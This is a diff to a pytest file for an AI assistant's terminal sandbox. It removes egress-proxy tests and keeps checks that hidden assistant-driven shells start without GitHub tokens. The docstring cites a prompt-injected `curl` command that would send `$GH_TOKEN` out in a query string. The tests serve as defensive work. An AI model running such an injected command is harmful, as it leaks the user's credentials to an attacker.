@@ -3,8 +3,7 @@
 A hidden PTY (terminal_run's sandbox mode and terminal_send's persistent
 interactive shell) is driven by the assistant, so it gets the run_sandboxed
 environment: no GitHub tokens (a prompt-injected `curl "...?t=$GH_TOKEN"`
-finds nothing), the egress proxy vars under a non-permissive network tier,
-and the scratch package caches of a confined run. A visible PTY is the
+finds nothing) and the scratch package caches of a confined run. A visible PTY is the
 user's own terminal and keeps their environment.
 """
 
@@ -16,29 +15,15 @@ import pytest
 
 import server.sandbox as sandbox
 from server import terminal as t
-from server.security import egress_policy
 from server.security.sensitive_env import GITHUB_ENV_VARS
-
-_PROXY = "http://127.0.0.1:54321"
-_PROXY_KEYS = ("HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "http_proxy")
-
-
-def _permissive_policy():
-    return {"tier": "permissive", "custom_allowed_domains": [], "methods_only_safe": False}
-
-
-def _curated_policy():
-    return {"tier": "curated", "custom_allowed_domains": [], "methods_only_safe": False}
 
 
 @pytest.fixture
 def server_env(monkeypatch):
-    """GitHub tokens and one ordinary variable in the server's environment,
-    under the default (permissive) network tier."""
+    """GitHub tokens and one ordinary variable in the server's environment."""
     for name in GITHUB_ENV_VARS:
         monkeypatch.setenv(name, f"secret-{name}")
     monkeypatch.setenv("WS_KEEP_ME", "yes")
-    monkeypatch.setattr(egress_policy, "get_active_policy", _permissive_policy)
 
 
 @pytest.fixture
@@ -79,21 +64,6 @@ def test_hidden_pty_starts_with_the_run_sandboxed_env(server_env, spawn_env):
     assert env == expected
 
 
-def test_hidden_pty_gets_the_egress_proxy_under_a_non_permissive_tier(
-    server_env, spawn_env, monkeypatch
-):
-    # Its sandbox profile denies direct 80/443, so without the proxy vars a
-    # hidden shell has no HTTP at all.
-    monkeypatch.setattr(egress_policy, "get_active_policy", _curated_policy)
-    monkeypatch.setattr(egress_policy, "ensure_proxy_running", lambda: ("127.0.0.1", 54321))
-
-    env = spawn_env(hidden=True)
-
-    for key in _PROXY_KEYS:
-        assert env[key] == _PROXY
-    assert not GITHUB_ENV_VARS & env.keys()
-
-
 def test_confined_hidden_pty_keeps_its_scratch_package_caches(server_env, spawn_env, tmp_path):
     scratch = str(tmp_path / "scratch")
 
@@ -103,13 +73,7 @@ def test_confined_hidden_pty_keeps_its_scratch_package_caches(server_env, spawn_
     assert not GITHUB_ENV_VARS & env.keys()
 
 
-def test_visible_pty_keeps_the_users_environment(server_env, spawn_env, monkeypatch):
-    def _fail_if_called():
-        raise AssertionError("a visible PTY must not start the egress proxy")
-
-    monkeypatch.setattr(egress_policy, "get_active_policy", _curated_policy)
-    monkeypatch.setattr(egress_policy, "ensure_proxy_running", _fail_if_called)
-
+def test_visible_pty_keeps_the_users_environment(server_env, spawn_env):
     env = spawn_env()
 
     assert env["GH_TOKEN"] == "secret-GH_TOKEN"
